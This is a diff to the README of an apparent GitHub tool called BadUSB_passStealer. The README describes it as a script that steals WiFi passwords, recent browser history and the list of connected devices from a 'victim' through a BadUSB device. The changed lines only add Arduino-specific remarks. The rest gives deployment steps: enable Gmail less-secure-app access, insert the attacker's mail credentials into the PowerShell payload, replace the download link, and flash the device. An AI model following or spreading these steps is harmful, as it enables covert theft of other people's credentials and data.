@@ -7,7 +7,7 @@ This **script** allows you to steal the following **information** :
 * **WiFi** passwords;
 * Browser **history** from the last 7 days;
 * The list of all **devices** that are **connected to victim's network**;
-### NB n°1
+### NB n°1 (for arduino BadUSB)
 Sometimes, you will see something like this : 
 ``` 
 Keyboard.press(KEY_LEFT_CTRL);
@@ -33,7 +33,7 @@ You can customize the **delay** according to the speed in which you plug the **B
 ## Requirments
 1. Have a **BadUSB**.
 
-2. Install **Arduino software** [here](https://www.arduino.cc/en/software);
+2. Install **Arduino software** [here](https://www.arduino.cc/en/software) (if you use a BadUSB which is based on arduino);
 
 3. Have a **Gmail** account and enable **less secure app** [here](https://www.google.com/settings/security/lesssecureapps);
 ## Install
@@ -48,7 +48,7 @@ cd BadUSB_passStealer
 
 2. Replace your mail and password [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/ciaoV2.ps1) at line 16, 18, 19;
 
-3. Replace link [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) at line 85;
+3. Replace link [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) at line 85;
 
 4. Add your code in the **BadUSB** by **Arduino software**;
 
